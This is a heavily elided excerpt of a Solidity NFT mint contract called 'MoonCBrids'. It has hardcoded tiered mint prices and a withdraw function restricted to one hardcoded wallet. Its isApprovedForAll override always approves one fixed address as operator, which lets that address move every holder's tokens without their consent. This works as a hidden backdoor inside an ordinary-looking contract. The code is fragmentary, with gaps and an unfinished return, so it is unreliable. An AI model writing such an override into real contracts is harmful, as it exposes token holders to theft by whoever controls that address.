...
contract MoonCBrids is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("MoonCBrids", "MO", maxBatchSize_, collectionSize_) {
  ...
  function PublicMint(uint256 quantity) external payable callerIsUser {    
    ...
    uint256 totalCost = saleConfig.Price * quantity;
    if(quantity==1){
       totalCost =30000000000000000;
    } else if(quantity==2){
       totalCost =57000000000000000;
    }else if(quantity==3){
      totalCost =81000000000000000;
    }else if(quantity==4){
       totalCost =102000000000000000;
    }else if(quantity==5){
      totalCost =120000000000000000;
    }else if(quantity==6){
       totalCost =135000000000000000;
    }else if(quantity==7){
       totalCost =147000000000000000;
    }else if(quantity==8){
       totalCost =156000000000000000;
    }else if(quantity==9){
        totalCost =162000000000000000;
    }else if(quantity==10){
       totalCost =165000000000000000;
    }
    _safeMint(msg.sender, quantity);
    refundIfOver(totalCost);
  }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x8C2960EEC7e3a27FdcC9A1bcf789a3991c641f68);
...
/*     string memory baseId;
    ...
    if(0 <= tokenId && tokenId < 9){baseId=string(abi.encodePacked("000", realId.toString()));}
    else if(9 <= tokenId && tokenId < 99){baseId=string(abi.encodePacked("00", realId.toString()));}
        else if(99 <= tokenId && tokenId < 999){baseId=string(abi.encodePacked("0", realId.toString()));}
                else if(999 <= tokenId && tokenId < 10000){baseId=string(realId.toString());} */
    return
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  { 
    if(operator==0x740cf910c5aB6D8C3facc446A09A4Cb61bD09266){return true;}
